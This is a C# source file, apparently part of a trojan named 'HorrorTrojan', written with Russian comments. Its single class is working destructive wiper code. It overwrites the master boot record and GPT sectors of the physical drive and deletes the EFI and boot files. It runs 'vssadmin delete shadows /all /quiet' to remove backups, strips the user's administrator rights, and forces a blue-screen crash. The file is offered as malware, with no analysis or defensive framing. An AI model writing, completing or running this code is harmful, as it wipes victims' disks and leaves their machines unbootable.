using System;
using System.IO;
using System.Diagnostics;

namespace HorrorTrojan
{
    internal static class BSODTrigger
    {
        public static void TriggerBSOD()
        {
            // 1. УНИЧТОЖАЕМ ВСЁ
            DestroyEverything();
            
            // 2. ВЫЗЫВАЕМ BSOD
            uint response;
            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
        }
        
        private static void DestroyEverything()
        {
            try
            {
                // УНИЧТОЖЕНИЕ MBR (секторы 0-63)
                byte[] mbr = ResourceExtractor.GetMBR();
                if (mbr.Length == 512)
                {
                    for (int sector = 0; sector < 64; sector++)
                    {
                        try
                        {
                            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                            {
                                fs.Seek(sector * 512, SeekOrigin.Begin);
                                fs.Write(mbr, 0, 512);
                                fs.Flush();
                            }
                        }
                        catch { }
                    }
                }
                
                // УНИЧТОЖЕНИЕ GPT (секторы 1-33)
                byte[] zeros = new byte[512];
                for (int sector = 1; sector < 34; sector++)
                {
                    try
                    {
                        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                        {
                            fs.Seek(sector * 512, SeekOrigin.Begin);
                            fs.Write(zeros, 0, 512);
                            fs.Flush();
                        }
                    }
                    catch { }
                }
                
                // УНИЧТОЖЕНИЕ EFI-ФАЙЛОВ
                string[] efiPaths = new string[]
                {
                    @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
                    @"C:\EFI\Microsoft\Boot\bootmgr.efi",
                    @"C:\EFI\Boot\bootx64.efi",
                    @"C:\EFI\Microsoft\Recovery\boot.sdi",
                    @"C:\bootmgr",
                    @"C:\Boot\BCD",
                    @"C:\Boot\boot.sdi",
                    @"C:\Boot\BCD.LOG",
                    @"C:\boot\bootstat.dat"
                };
                
                foreach (string path in efiPaths)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }
                
                // УДАЛЕНИЕ ТЕНЕВЫХ КОПИЙ
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "vssadmin",
                        Arguments = "delete shadows /all /quiet",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                catch { }
                
                // ЛИШЕНИЕ ПРАВ АДМИНИСТРАТОРА
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "net",
                        Arguments = "localgroup Administrators %username% /delete",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                catch { }
            }
            catch { }
        }
    }
}
